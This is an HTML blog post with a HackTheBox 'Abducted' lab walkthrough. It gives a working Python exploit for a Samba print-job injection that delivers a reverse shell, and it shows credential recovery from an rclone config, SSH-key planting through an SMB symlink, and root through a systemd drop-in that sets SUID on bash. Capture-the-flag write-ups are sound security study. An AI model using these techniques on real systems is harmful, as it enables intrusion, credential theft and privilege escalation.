@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Abducted — NOCTIS</title>
+<meta name="description" content="HackTheBox Abducted machine walkthrough — unauthenticated RCE via a Samba print-spooler %J injection (CVE-2026-4480), credential recovery from an rclone config, SMB symlink key injection, and a systemd drop-in to root.">
+<meta property="og:title" content="HTB: Abducted — NOCTIS">
+<meta property="og:description" content="HackTheBox Abducted machine walkthrough — unauthenticated RCE via a Samba print-spooler %J injection (CVE-2026-4480), credential recovery from an rclone config, SMB symlink key injection, and a systemd drop-in to root.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://sp1r4.github.io/writeups/htb-abducted.html">
+<meta property="og:image" content="https://sp1r4.github.io/writeups/assets/og/htb-abducted.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://sp1r4.github.io/writeups/assets/og/htb-abducted.png">
+<link rel="canonical" href="https://sp1r4.github.io/writeups/htb-abducted.html">
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    /* terminal colors — muted to stay on-brand */
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ── NAV ── */
+
+  /* ── WRAPPER ── */
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  /* ── POST HEADER ── */
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-smb  { background: #d8c8b8; color: #5a3a18; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  /* ── OVERVIEW BOX ── */
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  /* ── ATTACK CHAIN ── */
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  /* ── HEADINGS ── */
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 1rem;
+  }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  /* ── INLINE CODE ── */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  /* ── TERMINAL BLOCK ── */
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  /* prompt colors — muted to match cream palette */
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  /* ── ALERT BOXES ── */
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  /* ── TABLE ── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  /* ── LISTS ── */
+  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  /* ── SUMMARY TABLE special cols ── */
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  /* ── FOOTER ── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  /* ── BACK LINK ── */
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<script id="noctis-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Abducted",
+  "description": "HackTheBox Abducted machine walkthrough — unauthenticated RCE via a Samba print-spooler %J injection (CVE-2026-4480), credential recovery from an rclone config, SMB symlink key injection, and a systemd drop-in to root.",
+  "datePublished": "2026-08-04",
+  "dateModified": "2026-08-04",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://sp1r4.github.io/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "NOCTIS",
+    "url": "https://sp1r4.github.io/"
+  },
+  "url": "https://sp1r4.github.io/writeups/htb-abducted.html",
+  "image": "https://sp1r4.github.io/writeups/assets/og/htb-abducted.png",
+  "keywords": [
+    "offensive"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://sp1r4.github.io/blog.html#htb-abducted"
+  },
+  "timeRequired": "PT7M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://sp1r4.github.io/blog.html">← Back to posts</a>
+
+  <!-- POST HEADER -->
+  <div class="post-header">
+    <h1>HTB: Abducted</h1>
+    <div class="post-meta">
+      <span class="date">August 4, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-smb">Samba</span>
+      <span class="tag">Linux</span>
+      <span class="tag">Medium</span>
+      <span>&nbsp;7 min read</span>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <!-- OVERVIEW -->
+  <div class="overview">
+    Abducted is a Samba-only box — no web server, just SSH and two SMB ports. The path in is an unauthenticated <strong>print-spooler shell injection</strong> (CVE-2026-4480) against a guest-accessible printer share, which lands as <code>nobody</code>. From there it's a straight line through a leaked <strong>rclone</strong> credential, password reuse into SSH, an <strong>SMB wide-links symlink</strong> abused to plant an SSH key as a second user, and a final privesc through a group-writable <strong>systemd drop-in</strong> for the Samba service.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">Guest SMB (HP-Reception)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">CVE-2026-4480 RCE</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">nobody</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">rclone.conf</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">scott (SSH)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">marcus (SMB symlink)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root (systemd)</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <h3>Nmap</h3>
+  <p>Standard service scan against the box:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nmap -sC -sV -A &lt;TARGET_IP&gt; -oA abducted</span>
+
+<span class="po">PORT    STATE SERVICE       VERSION
+22/tcp  open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+139/tcp open  netbios-ssn   Samba smbd 4
+445/tcp open  netbios-ssn   Samba smbd 4</span></div>
+  </div>
+
+  <table>
+    <tr><th>Port</th><th>Service</th><th>Notes</th></tr>
+    <tr><td>22</td><td>SSH</td><td>OpenSSH 9.6p1 Ubuntu</td></tr>
+    <tr><td>139/445</td><td>SMB</td><td>Samba smbd 4 — NetBIOS name <code>ABDUCTED</code>, server string "Hartley Group Document Services"</td></tr>
+  </table>
+
+  <p>No web server on this one — SMB is the entire attack surface. Add the hostname:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/etc/hosts</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">echo "&lt;TARGET_IP&gt;  abducted.htb" | sudo tee -a /etc/hosts</span></div>
+  </div>
+
+  <!-- ══ SMB ENUM ══ -->
+  <h2>SMB &amp; RPC Enumeration</h2>
+
+  <p>Listing shares with a null session:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">smbclient -L</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">smbclient -L //&lt;TARGET_IP&gt; -N</span>
+
+<span class="po">Sharename       Type      Comment
+---------       ----      -------
+HP-Reception    Printer   Reception printer
+projects        Disk      Hartley Group Project Files
+transfer        Disk      Staff file transfer
+IPC$            IPC       IPC Service (Hartley Group Document Services)</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">smbclient //&lt;TARGET_IP&gt;/projects -N</span>
+<span class="pr">NT_STATUS_ACCESS_DENIED</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">smbclient //&lt;TARGET_IP&gt;/transfer -N</span>
+<span class="pr">NT_STATUS_ACCESS_DENIED</span></div>
+  </div>
+
+  <p>Both disk shares reject guest access — <code>HP-Reception</code> is the only thing open, and it's a printer, not a file share. <code>rpcclient</code> against the null session pulls a username and confirms the share paths on disk:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">rpcclient</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">rpcclient -U "" -N &lt;TARGET_IP&gt;</span>
+
+<span class="pd">rpcclient $&gt; </span><span class="pc">enumdomusers</span>
+<span class="po">user:[</span><span class="py">scott</span><span class="po">] rid:[0x3e8]</span>
+
+<span class="pd">rpcclient $&gt; </span><span class="pc">netshareenum</span>
+<span class="po">netname: HP-Reception
+path:    C:\var\spool\samba
+netname: projects
+path:    C:\srv\projects
+netname: transfer
+path:    C:\srv\transfer</span></div>
+  </div>
+
+  <div class="alert alert-info">
+    One local user (<strong>scott</strong>), a guest-writable printer share backed by <code>/var/spool/samba</code>, and a print server exposed to anonymous users. Combined with the box name and a recent Samba CVE, the printer is the way in.
+  </div>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Initial Foothold — CVE-2026-4480 (Samba %J Print Injection)</h2>
+
+  <p>CVE-2026-4480 is an unauthenticated command injection in Samba's print spooler. When a print job is submitted, Samba substitutes the client-supplied job name into the configured <code>print command</code> via the <code>%J</code> token — without sanitizing shell metacharacters. Setting the job name to <code>|sh</code> and writing a shell payload as the job body gets that payload executed by whatever account runs <code>smbd</code>'s print handler.</p>
+
+  <p>The exploit talks to the <code>spoolss</code> named pipe directly: open a handle on the printer, start a document with job name <code>|sh</code>, and write the payload as the print data.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">cve-2026-4480.py — core exploit logic</span>
+    </div>
+    <div class="term-body"><span class="pco"># apt install python3-samba</span>
+<span class="pb">from</span> samba.dcerpc <span class="pb">import</span> spoolss
+<span class="pb">from</span> samba.param <span class="pb">import</span> LoadParm
+<span class="pb">from</span> samba.credentials <span class="pb">import</span> Credentials
+
+lp = LoadParm(); lp.load_default()
+creds = Credentials(); creds.guess(lp); creds.set_anonymous()
+
+iface = spoolss.spoolss(<span class="py">f'ncacn_np:{rhost}[\\pipe\\spoolss]'</span>, lp, creds)
+h = iface.OpenPrinter(<span class="py">f'\\\\{rhost}\\HP-Reception'</span>, <span class="py">''</span>, spoolss.DevmodeContainer(), 0x8)
+
+i1 = spoolss.DocumentInfo1()
+i1.document_name = <span class="py">'|sh'</span>          <span class="pco"># %J injection point</span>
+i1.datatype = <span class="py">'RAW'</span>
+ctr = spoolss.DocumentInfoCtr(); ctr.level = 1; ctr.info = i1
+
+iface.StartDocPrinter(h, ctr)
+iface.StartPagePrinter(h)
+iface.WritePrinter(h, payload, len(payload))   <span class="pco"># reverse shell one-liner</span>
+iface.EndPagePrinter(h); iface.EndDocPrinter(h); iface.ClosePrinter(h)</span></div>
+  </div>
+
+  <p>Listener up, exploit fired at the printer share:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">exploit run</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nc -lvnp 4444</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">python3 cve-2026-4480.py -r &lt;TARGET_IP&gt; -l &lt;YOUR_IP&gt; -p 4444</span>
+<span class="po">[*] Connecting to spoolss pipe on &lt;TARGET_IP&gt; ...
+[*] Opening printer handle: \\&lt;TARGET_IP&gt;\HP-Reception
+[*] Submitting print job with job name '|sh' (%J injection) ...
+[+] Job submitted successfully — check your listener!</span>
+
+<span class="pg">connect to [&lt;YOUR_IP&gt;] from (UNKNOWN) [&lt;TARGET_IP&gt;] 41288
+(remote) nobody@abducted:/$ </span><span class="pc">id</span>
+<span class="pg">uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)</span></div>
+  </div>
+
+  <div class="alert alert-success">Shell as <strong>nobody</strong> — the Samba guest account, running unauthenticated straight off the print spooler.</div>
+
+  <!-- ══ POST-EXPLOIT ══ -->
+  <h2>Post-Exploitation — rclone Credentials</h2>
+
+  <p>Sweeping for config files outside the usual system paths:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nobody — hunting for creds</span>
+    </div>
+    <div class="term-body"><span class="pg">(remote) nobody@abducted:/$ </span><span class="pc">find / -type f -name "*.conf" 2&gt;/dev/null | grep -Ev "^/usr/|^/etc/"</span>
+<span class="po">/opt/offsite-backup/rclone.conf</span>
+
+<span class="pg">(remote) nobody@abducted:/$ </span><span class="pc">cat /opt/offsite-backup/rclone.conf</span>
+<span class="po">[offsite]
+type = sftp
+host = backup.hartley-group.internal
+user = svc-backup
+</span><span class="py">pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw</span>
+<span class="po">shell_type = unix</span></div>
+  </div>
+
+  <p><code>rclone</code> obfuscates stored passwords rather than encrypting them — <code>rclone reveal</code> reverses it in one shot:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">rclone reveal</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw</span>
+<span class="py">iXzvcib3SrpZ</span></div>
+  </div>
+
+  <!-- ══ LATERAL 1 ══ -->
+  <h2>Lateral Movement — SSH as scott (Password Reuse)</h2>
+
+  <p>Only two local users exist on the box (scott, marcus). The recovered <code>svc-backup</code> password gets tried against scott's SSH login and lands:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ssh — scott</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">ssh scott@abducted.htb</span>
+<span class="po">Password: </span><span class="py">iXzvcib3SrpZ</span>
+
+<span class="pg">scott@abducted:~$ </span><span class="pc">id</span>
+<span class="pg">uid=1000(scott) gid=1001(scott) groups=1001(scott)</span>
+<span class="pg">scott@abducted:~$ </span><span class="pc">cat user.txt</span>
+<span class="py">HTB{REDACTED}</span></div>
+  </div>
+
+  <div class="alert alert-success">🚩 User flag captured — svc-backup's rclone password was reused verbatim for scott's SSH account.</div>
+
+  <!-- ══ ENUM AS SCOTT ══ -->
+  <h2>Enumeration as scott</h2>
+
+  <p>No sudo rights. The Samba config is worth a second look now that there's a real shell to read it with:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">smb.conf / shares.conf</span>
+    </div>
+    <div class="term-body"><span class="pg">scott@abducted:~$ </span><span class="pc">sudo -l</span>
+<span class="pr">Sorry, user scott may not run sudo on abducted.</span>
+
+<span class="pg">scott@abducted:~$ </span><span class="pc">cat /etc/samba/shares.conf</span>
+<span class="po">[HP-Reception]
+path = /var/spool/samba
+printable = yes
+guest ok = yes
+</span><span class="py">print command = /usr/local/bin/printaudit %J %s</span>
+<span class="po">
+[transfer]
+comment = Staff file transfer
+path = /srv/transfer
+valid users = scott
+</span><span class="py">force user = marcus</span>
+<span class="po">read only = no
+</span><span class="py">wide links = yes</span>
+<span class="po">browseable = yes</span></div>
+  </div>
+
+  <div class="alert alert-warn">
+    <strong>print command</strong> confirms the CVE-2026-4480 chain — <code>%J</code> lands unescaped in the shell command. More useful right now: the <strong>transfer</strong> share runs everything as <code>marcus</code> (<code>force user</code>) and follows symlinks across share boundaries (<code>wide links = yes</code>). Any file written into <code>transfer</code> is owned by marcus, and a symlink inside it can point anywhere on disk.
+  </div>
+
+  <!-- ══ LATERAL 2 ══ -->
+  <h2>Lateral Movement — SSH Key Injection via SMB Symlink</h2>
+
+  <p>Scott can write to <code>/srv/transfer</code> directly on the filesystem. Planting a symlink there that points into marcus's home directory turns the SMB share into a write primitive as marcus:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">symlink + smbclient upload</span>
+    </div>
+    <div class="term-body"><span class="pg">scott@abducted:~$ </span><span class="pc">ln -s /home/marcus /srv/transfer/marcus</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">smbclient //&lt;TARGET_IP&gt;/transfer -U 'scott%iXzvcib3SrpZ'</span>
+
+<span class="pd">smb: \&gt; </span><span class="pc">cd marcus</span>
+<span class="pd">smb: \marcus\&gt; </span><span class="pc">mkdir .ssh</span>
+<span class="pd">smb: \marcus\&gt; </span><span class="pc">cd .ssh</span>
+<span class="pd">smb: \marcus\.ssh\&gt; </span><span class="pc">put id_rsa.pub authorized_keys</span>
+<span class="po">putting file id_rsa.pub as \marcus\.ssh\authorized_keys</span></div>
+  </div>
+
+  <p>SSH refuses keys that are world-readable, so the mode has to be stripped through the share before it'll be accepted:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">smbclient setmode + ssh</span>
+    </div>
+    <div class="term-body"><span class="pd">smb: \marcus\.ssh\&gt; </span><span class="pc">setmode authorized_keys a-r</span>
+<span class="pd">smb: \marcus\.ssh\&gt; </span><span class="pc">cd ..</span>
+<span class="pd">smb: \marcus\&gt; </span><span class="pc">setmode .ssh a-r+d</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">ssh -i id_rsa marcus@abducted.htb</span>
+
+<span class="pg">marcus@abducted:~$ </span><span class="pc">id</span>
+<span class="pg">uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),</span><span class="py">1000(operators)</span></div>
+  </div>
+
+  <div class="alert alert-success">SSH as <strong>marcus</strong> — and a membership in <code>operators</code> worth chasing.</div>
+
+  <!-- ══ ROOT ══ -->
+  <h2>Privilege Escalation to Root — systemd Drop-in</h2>
+
+  <p>Finding what that group actually grants access to:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">marcus — operators group</span>
+    </div>
+    <div class="term-body"><span class="pg">marcus@abducted:~$ </span><span class="pc">find / -group operators 2&gt;/dev/null</span>
+<span class="py">/etc/systemd/system/smbd.service.d</span></div>
+  </div>
+
+  <p><code>operators</code> owns the drop-in directory for the <code>smbd</code> systemd unit. Drop-ins layer extra directives onto a service without touching the base unit file — an <code>ExecStartPre</code> here runs as root the moment the service restarts:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">malicious drop-in → SUID bash → root</span>
+    </div>
+    <div class="term-body"><span class="pg">marcus@abducted:~$ </span><span class="pc">cat &gt; /etc/systemd/system/smbd.service.d/privesc.conf &lt;&lt; 'EOF'
+[Service]
+ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'
+EOF</span>
+
+<span class="pg">marcus@abducted:~$ </span><span class="pc">systemctl daemon-reload &amp;&amp; systemctl restart smbd</span>
+
+<span class="pg">marcus@abducted:~$ </span><span class="pc">bash -p</span>
+<span class="pr">bash-5.2#</span> <span class="pc">whoami</span>
+<span class="pr">root</span>
+<span class="pr">bash-5.2#</span> <span class="pc">cat /root/root.txt</span>
+<span class="py">HTB{REDACTED}</span></div>
+  </div>
+
+  <div class="alert alert-success">🚩 Root flag captured. <code>ExecStartPre</code> ran as root on service restart, set the SUID bit on <code>/bin/bash</code>, and <code>bash -p</code> preserved privileges into a root shell.</div>
+
+  <!-- ══ SUMMARY ══ -->
+  <h2>Summary</h2>
+
+  <table class="st">
+    <tr><th>Stage</th><th>Technique</th><th>Tool</th></tr>
+    <tr><td>Foothold</td><td>CVE-2026-4480 — Samba <code>%J</code> print job shell injection, unauth</td><td>python3-samba</td></tr>
+    <tr><td>Credential theft</td><td>Obfuscated rclone password in world-readable config</td><td>rclone reveal</td></tr>
+    <tr><td>Lateral move</td><td>Password reuse (svc-backup → scott)</td><td>ssh</td></tr>
+    <tr><td>Lateral move</td><td>SMB <code>force user</code> + <code>wide links</code> symlink → key injection</td><td>smbclient</td></tr>
